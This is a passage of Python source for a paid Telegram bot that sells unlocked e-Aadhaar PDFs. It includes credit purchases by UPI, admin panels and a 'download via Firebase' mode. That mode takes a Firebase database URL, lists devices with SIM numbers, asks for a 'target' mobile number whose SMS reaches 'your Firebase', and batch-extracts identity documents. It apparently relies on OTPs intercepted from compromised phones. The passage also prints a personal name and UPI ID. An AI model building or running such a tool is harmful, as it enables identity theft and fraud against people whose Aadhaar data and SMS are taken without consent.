            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
            f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
            f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
            f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
            f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ\n\n"
            f"{DIVIDER}\n"
            f"💰  ᴄʀᴇᴅɪᴛs  ·  <b>{cr_display}</b>\n\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        return

    if data == 'admin_stats' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        data_all       = all_users()
        total          = len(data_all)
        lifetime_count = sum(1 for u in data_all.values() if u.get('lifetime'))
        banned_count   = sum(1 for u in data_all.values() if u.get('banned'))
        total_credits  = sum(u.get('credits', 0) for u in data_all.values() if not u.get('lifetime'))
        channel_joins  = database.get_channel_verified_count()
        invite_link    = get_channel_invite_url()
        dl_stats       = database.get_download_stats()

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📊 sᴛᴀᴛɪsᴛɪᴄs</b>\n\n"
            f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs      —  <b>{total}</b>\n"
            f"📢  ᴄʜᴀɴɴᴇʟ ᴊᴏɪɴs    —  <b>{channel_joins}</b>\n"
            f"♾️   ʟɪғᴇᴛɪᴍᴇ         —  <b>{lifetime_count}</b>\n"
            f"🚫  ʙᴀɴɴᴇᴅ           —  <b>{banned_count}</b>\n"
            f"💰  ᴄʀᴇᴅɪᴛs ᴘᴏᴏʟ     —  <b>{total_credits}</b>\n\n"
            f"📥  <b>ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅs:</b>\n"
            f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
            f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
            f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
            f"  📊  <b>ᴛᴏᴛᴀʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
            f"🔗  <b>ʙᴏᴛ ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b>\n<code>{invite_link}</code>\n"
            f"{DIVIDER}"
        )
        return

    if data == 'admin_users' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        data_all = all_users()
        lines = [f"<b>👥 ᴜsᴇʀs ʟɪsᴛ ({len(data_all)})</b>\n{DIVIDER}"]
        for uid, u in list(data_all.items())[:35]:
            cr = "♾️" if u.get('lifetime') else str(int(u.get('credits', 0)))
            b = " 🚫" if u.get('banned') else ""
            fn = (u.get('first_name') or '').strip()
            ln = (u.get('last_name') or '').strip()
            full_name = f"{fn} {ln}".strip() or "No Name"
            username = u.get('username')
            uname_str = f"@{username}" if username else "No User"
            lines.append(f"• <code>{uid}</code> | <b>{full_name}</b> ({uname_str}) — <b>{cr} cr</b>{b}")
        if len(data_all) > 35:
            lines.append(f"\n<i>…and {len(data_all) - 35} more users</i>")
        send_message(chat_id, "\n".join(lines))
        return

    if data == 'admin_userinfo_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_userinfo')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🔍 Enter User ID to lookup:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_send_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_send')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🎁 Enter: <code>USERID AMOUNT</code> (-1 for lifetime):", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_ban_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_ban')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🚫 Enter User ID to ban:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_unban_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_unban')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✅ Enter User ID to unban:", reply_markup=get_cancel_keyboard())
        return

    if data == 'admin_broadcast_prompt' and is_admin(chat_id):
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'admin_awaiting_broadcast')
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n📢 Send the broadcast message:", reply_markup=get_cancel_keyboard())
        return

    if data == 'check_join':
        # Clear member cache so Telegram is queried freshly for this check
        with _cm_lock:
            _channel_member_cache.pop(str(chat_id), None)
        if not is_force_check_enabled() or is_channel_member(chat_id):
            database.mark_channel_verified(chat_id)
            if user_info:
                ensure_user(
                    chat_id,
                    first_name=user_info.get('first_name'),
                    last_name=user_info.get('last_name'),
                    username=user_info.get('username')
                )
            else:
                ensure_user(chat_id)
            cr = get_credits(chat_id)
            cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
            remove_reply_keyboard(chat_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
                f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
                f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
                f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
                f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ\n\n"
                f"{DIVIDER}\n"
                f"💰  ᴄʀᴇᴅɪᴛs  ·  <b>{cr_display}</b>\n\n"
                f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
                reply_markup=get_welcome_inline_keyboard()
            )
        else:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>❌ ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ</b>\n\n"
                f"⚠️  ᴄʜᴀɴɴᴇʟ ᴍᴇᴍʙᴇʀsʜɪᴘ ɴᴏᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ.\n\n"
                f"<i>👇  ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ, ᴛʜᴇɴ ᴛᴀᴘ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_join_keyboard()
            )
        return

    if data == 'cancel':
        s = get_session(chat_id)
        qr_msg_id = s.get('data', {}).get('qr_msg_id')
        if qr_msg_id:
            delete_message(chat_id, qr_msg_id)
        if message_id and message_id != qr_msg_id:
            delete_message(chat_id, message_id)
        clear_session(chat_id)
        answer_callback_query(callback_query_id, "Cancelled")
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<i>❌  sᴇssɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.</i>\n\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        return

    if data == 'credits':
        answer_callback_query(callback_query_id)
        show_credits_info(chat_id)
        return

    if data == 'buy':
        answer_callback_query(callback_query_id)
        show_buy_menu(chat_id)
        return

    if data == 'referral':
        answer_callback_query(callback_query_id)
        show_referral_info(chat_id)
        return

    # ── CLOUDFLARE UPI AUTOMATIC CHECKOUT FLOW (2 BUTTONS ONLY) ──
    if data.startswith('buy_'):
        plan_key = data.split('_')[1]
        plan = PLANS.get(plan_key)
        if not plan:
            return
        answer_callback_query(callback_query_id, f"ɢᴇɴᴇʀᴀᴛɪɴɢ ᴜᴘɪ ᴄʜᴇᴄᴋᴏᴜᴛ ғᴏʀ {plan['price']}...")
        amount = plan['amount']
        
        # Check current cached UTR on gateway to ignore (prevent old payment collision)
        cached_paid, cached_data = gateway.check_recent_payment(amount)
        ignored_utr = str(cached_data.get('utr', '')).strip() if (cached_paid and cached_data) else None
        
        is_ok, pay_meta = gateway.generate_payment(amount)
        upi_link = pay_meta.get('upi_link', '')
        qr_bytes = gateway.generate_qr_bytes(upi_link)
        
        now = time.time()
        expires_at = now + 600  # 10 minute validity
        session_token = str(uuid.uuid4())
        
        caption = (
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🛒 ᴜᴘɪ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴄʜᴇᴄᴋᴏᴜᴛ</b>\n\n"
            f"💎  <b>ᴘʟᴀɴ</b>       ·  {plan['label']}\n"
            f"💵  <b>ᴀᴍᴏᴜɴᴛ</b>     ·  <b>{plan['price']}</b>\n"
            f"👤  <b>ᴘᴀʏᴇᴇ</b>      ·  <b>{pay_meta.get('payee_name', 'Faisal Abdul Aziz Ansari')}</b>\n"
            f"📱  <b>ᴜᴘɪ ɪᴅ</b>     ·  <code>{pay_meta.get('payee_vpa', 'faisal786786@fam')}</code>\n"
            f"⏳  <b>ᴠᴀʟɪᴅɪᴛʏ</b>   ·  <b>10:00 ᴍɪɴᴜᴛᴇs</b> <i>(ᴀᴜᴛᴏ-ᴄʜᴇᴄᴋɪɴɢ 🔄)</i>\n\n"
            f"{DIVIDER}\n"
            f"<b>ʜᴏᴡ ᴛᴏ ᴘᴀʏ:</b>\n"
            f"1️⃣ sᴄᴀɴ ǫʀ ᴄᴏᴅᴇ ᴀʙᴏᴠᴇ ғʀᴏᴍ ɢᴘᴀʏ, ᴘʜᴏɴᴇᴘᴇ, ᴘᴀʏᴛᴍ ᴏʀ ᴄʀᴇᴅ.\n"
            f"2️⃣ ᴘᴀʏ ᴇxᴀᴄᴛʟʏ <b>{plan['price']}</b>.\n"
            f"3️⃣ <b>ᴀᴜᴛᴏ-ᴅᴇᴛᴇᴄᴛ:</b> ᴏɴᴄᴇ ᴘᴀɪᴅ, ᴛʜɪs ᴍᴇssᴀɢᴇ ᴀᴜᴛᴏ-ᴜᴘᴅᴀᴛᴇs ɪɴsᴛᴀɴᴛʟʏ!\n"
            f"4️⃣ ᴏʀ ᴛᴀᴘ <b>ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs</b> ʙᴇʟᴏᴡ ᴛᴏ ᴠᴇʀɪғʏ ᴍᴀɴᴜᴀʟʟʏ."
        )
        
        pay_kb = get_payment_keyboard(plan_key)
        res = send_photo(chat_id, qr_bytes, caption=caption, reply_markup=pay_kb)
        qr_msg_id = res.get('result', {}).get('message_id') if (res and isinstance(res, dict)) else None
        
        set_session(chat_id, 'awaiting_utr', {
            'plan_key': plan_key,
            'amount': amount,
            'qr_msg_id': qr_msg_id,
            'session_token': session_token,
            'ignored_utr': ignored_utr,
            'expires_at': expires_at,
            'created_at': now
        })
        
        # Start background auto-check watcher
        threading.Thread(
            target=_auto_check_payment_worker,
            args=(chat_id, plan_key, amount, qr_msg_id, session_token, ignored_utr, expires_at),
            daemon=True
        ).start()
        return

    # ── CHECK PAYMENT STATUS CALLBACK ────────────────────
    if data.startswith('checkpay_'):
        plan_key = data.split('_')[1]
        plan = PLANS.get(plan_key, PLANS['100'])
        amount = plan['amount']
        
        sess = get_session(chat_id)
        sess_data = sess.get('data', {}) if sess.get('step') == 'awaiting_utr' else {}
        qr_msg_id = sess_data.get('qr_msg_id')
        ignored_utr = sess_data.get('ignored_utr')
        
        is_valid, utr, status = check_new_payment_for_session(amount, ignored_utr)
        
        if is_valid and utr:
            answer_callback_query(callback_query_id, "sᴛᴀᴛᴜs: sᴜᴄᴄᴇss (🎉 ᴘᴀʏᴍᴇɴᴛ ᴠᴇʀɪғɪᴇᴅ!)")
            success = record_successful_payment(chat_id, utr, amount, plan['credits'], plan['lifetime'])
            if success:
                clear_session(chat_id)
                if qr_msg_id:
                    delete_message(chat_id, qr_msg_id)
                if message_id and message_id != qr_msg_id:
                    delete_message(chat_id, message_id)
                    
                cr = get_credits(chat_id)
                cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ" if cr == float('inf') else f"{int(cr)} Credits"
                
                success_text = (
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🎉 ᴘᴀʏᴍᴇɴᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ & ᴠᴇʀɪғɪᴇᴅ!</b>\n\n"
                    f"✅  <b>ᴠᴇʀɪғɪᴇᴅ ᴜᴛʀ</b>   ·  <code>{utr}</code>\n"
                    f"💵  <b>ᴀᴍᴏᴜɴᴛ ᴘᴀɪᴅ</b>    ·  <b>₹{amount}</b>\n"
                    f"🎁  <b>ᴄʀᴇᴅɪᴛs ᴀᴅᴅᴇᴅ</b>  ·  <b>+{plan['credits']} Credits</b>\n"
                    f"📊  <b>ᴀᴘɪ sᴛᴀᴛᴜs</b>     ·  <code>SUCCESS</code>\n\n"
                    f"{DIVIDER}\n"
                    f"💰  <b>ᴛᴏᴛᴀʟ ʙᴀʟᴀɴᴄᴇ</b>  ·  <b>{cr_display}</b>\n\n"
                    f"<i>🚀 ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴘʀᴏᴄᴇᴇᴅ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs!</i>"
                )
                sent_resp = send_message(chat_id, success_text, reply_markup=get_welcome_inline_keyboard())
                sent_mid = sent_resp.get('result', {}).get('message_id') if (sent_resp and isinstance(sent_resp, dict)) else None
                if sent_mid:
                    set_message_reaction(chat_id, message_id=sent_mid, emoji="🎉")
                return
        else:
            answer_callback_query(callback_query_id, "sᴛᴀᴛᴜs: ᴘᴇɴᴅɪɴɢ (⏳ ɴᴏᴛ ʀᴇᴄᴇɪᴠᴇᴅ ʏᴇᴛ)")
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📊 ᴘᴀʏᴍᴇɴᴛ sᴛᴀᴛᴜs: <code>PENDING</code></b>\n\n"
                f"💵  <b>ᴇxᴘᴇᴄᴛᴇᴅ</b>  ·  <b>₹{amount}</b>\n"
                f"⏳  <b>sᴛᴀᴛᴜs</b>    ·  <code>PENDING</code>\n"
                f"🔄  <b>ᴘᴀɪᴅ</b>      ·  <b>NO</b>\n\n"
                f"{DIVIDER}\n"
                f"<i>💡 ɪғ ʏᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴘᴀɪᴅ ɪɴ ʏᴏᴜʀ ᴜᴘɪ ᴀᴘᴘ, ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴡɪᴛʜ ʏᴏᴜʀ <b>12-ᴅɪɢɪᴛ ᴜᴛʀ</b> ᴛᴏ ᴠᴇʀɪғʏ ɪɴsᴛᴀɴᴛʟʏ!</i>",
                reply_markup=get_payment_keyboard(plan_key)
            )
            return

    # ── Search flows gates ───────────────────────────────
    if data in ('search_mobile', 'search_aadhaar', 'search_eid', 'search_firebase'):
        if not channel_gate(chat_id) or not credit_gate(chat_id):
            return

    if data == 'search_mobile':
        set_session(chat_id, 'awaiting_mobile', {'mode': 'mobile'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ\n\n"
            f"<i>📲  ᴏᴛᴘ ᴡɪʟʟ ʙᴇ sᴇɴᴛ ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_aadhaar':
        set_session(chat_id, 'awaiting_aadhaar', {'mode': 'aadhaar'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ\n\n"
            f"<i>🔢  sᴘᴀᴄᴇs ᴀʀᴇ ʀᴇᴍᴏᴠᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_eid':
        set_session(chat_id, 'awaiting_eid_input', {'mode': 'eid'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ</b>\n\n"
            f"▸  ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ (ᴇɪᴅ)\n\n"
            f"<i>📋  ғᴏʀᴍᴀᴛ: 1234/56789/12345</i>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'search_firebase':
        set_session(chat_id, 'awaiting_fb_url', {'mode': 'firebase'})
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
            f"🌐  <b>ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ ʙʜᴇᴊᴏ:</b>\n\n"
            f"📋  <i>ᴇxᴀᴍᴘʟᴇs:</i>\n"
            f"• <code>https://my-panel-default-rtdb.firebaseio.com</code>\n"
            f"• <code>https://my-project.firebaseio.com/messages.json</code>\n\n"
            f"💡  <i>ᴀᴀᴘ ᴜʀʟ ᴀᴜʀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴇᴋ sᴀᴀᴛʜ ʙʜɪ ʙʜᴇᴊ sᴀᴋᴛᴇ ʜᴀɪɴ:</i>\n"
            f"<code>https://my-db.firebaseio.com 9876543210</code>",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'help':
        answer_callback_query(callback_query_id)
        show_help(chat_id)
    elif data.startswith('fb_dev_'):
        answer_callback_query(callback_query_id)
        try:
            idx = int(data.split('_')[2])
            sess = get_session(chat_id)
            d = sess.get('data', {})
            devices = d.get('devices', [])
            fb_url = d.get('fb_url', '')
            if idx >= len(devices) or not fb_url:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Device not found. Please re-scan.", reply_markup=get_welcome_inline_keyboard())
                return
            dev = devices[idx]
            mob = dev.get('mobile')
            if not mob:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Selected device has no SIM mobile number. Please choose another device or enter manually.", reply_markup=get_cancel_keyboard())
                return
            if not credit_gate(chat_id):
                return
            update_session_data(chat_id, 'fb_mobile', mob)
            update_session_data(chat_id, 'dev_id', dev.get('dev_id'))
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_download_worker, chat_id, mob, fb_url, dev.get('dev_id'))
        except Exception as e:
            logger.error(f"Error handling fb_dev callback: {e}", exc_info=True)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error selecting device: {e}", reply_markup=get_welcome_inline_keyboard())
        return
    elif data.startswith('fb_batch_'):
        answer_callback_query(callback_query_id)
        try:
            count_str = data.split('_')[2]
            sess = get_session(chat_id)
            d = sess.get('data', {})
            devices = d.get('devices', [])
            fb_url = d.get('fb_url', '')
            valid_devs = [x for x in devices if x.get('mobile')]
            if not valid_devs or not fb_url:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ No valid devices with mobile found to extract.", reply_markup=get_welcome_inline_keyboard())
                return

            req_count = len(valid_devs) if count_str == 'all' else min(int(count_str), len(valid_devs))
            cr = get_credits(chat_id)
            is_adm = is_admin(chat_id)
            if not is_adm and cr != float('inf') and cr < 1:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Insufficient credits. Please recharge credits to download.", reply_markup=get_buy_keyboard())
                return

            if not is_adm and cr != float('inf') and cr < req_count:
                req_count = int(cr)

            selected_devices = valid_devs[:req_count]
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_batch_worker, chat_id, fb_url, selected_devices)
        except Exception as e:
            logger.error(f"Error handling fb_batch callback: {e}", exc_info=True)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error starting batch: {e}", reply_markup=get_welcome_inline_keyboard())
        return
    elif data.startswith('fb_page_'):
        answer_callback_query(callback_query_id)
        try:
            p = int(data.split('_')[2])
            show_firebase_devices_menu(chat_id, page=p)
        except Exception:
            pass
        return
    elif data == 'fb_manual':
        answer_callback_query(callback_query_id)
        set_session(chat_id, 'awaiting_fb_mobile', get_session(chat_id)['data'])
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>✏️ ᴇɴᴛᴇʀ ᴄᴜsᴛᴏᴍ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ</b>\n\n"
            f"▸ ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ:\n\n"
            f"<i>💡 ʏᴇʜ ɴᴜᴍʙᴇʀ ᴀᴀᴅʜᴀᴀʀ sᴇ ʟɪɴᴋ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ ᴀᴜʀ ɪsᴋᴀ sᴍs ᴀᴀᴘᴋᴇ ғɪʀᴇʙᴀsᴇ ᴘᴀʀ ᴀᴀɴᴀ ᴄʜᴀʜɪʏᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return
    elif data == 'noop':
        answer_callback_query(callback_query_id)
        return

# ============== MESSAGE HANDLER ==============
_KB_ACTIONS = {
    'mobile number':         'search_mobile',
    'aadhaar number':        'search_aadhaar',
    'eid':                   'search_eid',
    'download via firebase': 'search_firebase',
    'firebase':              'search_firebase',
    'credits':               'credits',
    'buy credits':           'buy',
    'referral':              'referral',
    'help':                  'help',
}

def handle_message(chat_id, message_text, message_id=None, user_info=None):
    logger.info(f"Msg [{chat_id}]: {message_text[:60]}")
    user_info = user_info or {}
    ensure_user(
        chat_id,
        first_name=user_info.get('first_name'),
        last_name=user_info.get('last_name'),
        username=user_info.get('username')
    )

    if ban_gate(chat_id):
        return

    if is_admin(chat_id) and message_text.startswith('/'):
        if handle_admin_command(chat_id, message_text):
            return

    # Direct help command
    if message_text.strip().lower() in ('/help', 'help', '/guide', 'guide'):
        show_help(chat_id)
        return

    # Clean text converting from Small Caps back to standard ascii
    clean_text = from_sc(message_text.strip().lower())
    clean_text = emoji.replace_emoji(clean_text, replace='').strip()
    clean_text = re.sub(r'[^\w\s]', '', clean_text).strip()
    clean_text = ' '.join(clean_text.split())

    if clean_text in ('cancel', 'back'):
        s = get_session(chat_id)
        qr_mid = s.get('data', {}).get('qr_msg_id')
        if qr_mid:
            delete_message(chat_id, qr_mid)
        clear_session(chat_id)
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>❌  sᴇssɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.</i>", reply_markup=get_welcome_inline_keyboard())
        return

    action = _KB_ACTIONS.get(clean_text)
    if action:
        s = get_session(chat_id)
        qr_mid = s.get('data', {}).get('qr_msg_id')
        if qr_mid:
            delete_message(chat_id, qr_mid)
        if action in ('search_mobile', 'search_aadhaar', 'search_eid', 'search_firebase'):
            if not channel_gate(chat_id) or not credit_gate(chat_id):
                return
            clear_session(chat_id)
            if action == 'search_mobile':
                set_session(chat_id, 'awaiting_mobile', {'mode': 'mobile'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ", reply_markup=get_cancel_keyboard())
            elif action == 'search_aadhaar':
                set_session(chat_id, 'awaiting_aadhaar', {'mode': 'aadhaar'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ", reply_markup=get_cancel_keyboard())
            elif action == 'search_eid':
                set_session(chat_id, 'awaiting_eid_input', {'mode': 'eid'})
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ</b>\n\n▸ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ (ᴇɪᴅ)", reply_markup=get_cancel_keyboard())
            elif action == 'search_firebase':
                set_session(chat_id, 'awaiting_fb_url', {'mode': 'firebase'})
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
                    f"🌐  <b>ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ ʙʜᴇᴊᴏ:</b>\n\n"
                    f"📋  <i>ᴇxᴀᴍᴘʟᴇs:</i>\n"
                    f"• <code>https://my-panel-default-rtdb.firebaseio.com</code>\n"
                    f"• <code>https://my-project.firebaseio.com/messages.json</code>\n\n"
                    f"💡  <i>ᴀᴀᴘ ᴜʀʟ ᴀᴜʀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴇᴋ sᴀᴀᴛʜ ʙʜɪ ʙʜᴇᴊ sᴀᴋᴛᴇ ʜᴀɪɴ:</i>\n"
                    f"<code>https://my-db.firebaseio.com 9876543210</code>",
                    reply_markup=get_cancel_keyboard()
                )
        elif action == 'credits':
            show_credits_info(chat_id)
        elif action == 'buy':
            show_buy_menu(chat_id)
        elif action == 'referral':
            show_referral_info(chat_id)
        elif action == 'help':
            show_help(chat_id)
        return

    s = get_session(chat_id)
    current_step = s.get('step', 'main')
    d = s.get('data', {})

    # ── AUTOMATIC UTR SUBMISSION & VERIFICATION ──────────
    digits_only = re.sub(r'\D', '', message_text.strip())
    if current_step == 'awaiting_utr' or (len(digits_only) == 12 and current_step == 'main'):
        utr = digits_only
        if len(utr) == 12:
            expected_plan_key = d.get('plan_key', '100')
            plan = PLANS.get(expected_plan_key, PLANS['100'])
            expected_amount = plan['amount']
            credits_to_add = plan['credits']
            is_lifetime_tier = plan['lifetime']
            
            if is_utr_claimed(utr):
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🚫 ᴜᴛʀ ᴀʟʀᴇᴀᴅʏ ᴄʟᴀɪᴍᴇᴅ</b>\n\n"
                    f"⚠️  ᴜᴛʀ <code>{utr}</code> ʜᴀs ᴀʟʀᴇᴀᴅʏ ʙᴇᴇɴ ʀᴇᴅᴇᴇᴍᴇᴅ.\n"
                    f"❌  ᴇᴀᴄʜ ᴜᴘɪ ᴛʀᴀɴsᴀᴄᴛɪᴏɴ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ᴏɴᴄᴇ.",
                    reply_markup=get_welcome_inline_keyboard()
                )
                return

            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>🔍 ᴠᴇʀɪғʏɪɴɢ ᴜᴘɪ ᴘᴀʏᴍᴇɴᴛ…</b>\n\n"
                f"🔢  ᴜᴛʀ ʀᴇғᴇʀᴇɴᴄᴇ ·  <code>{utr}</code>\n"
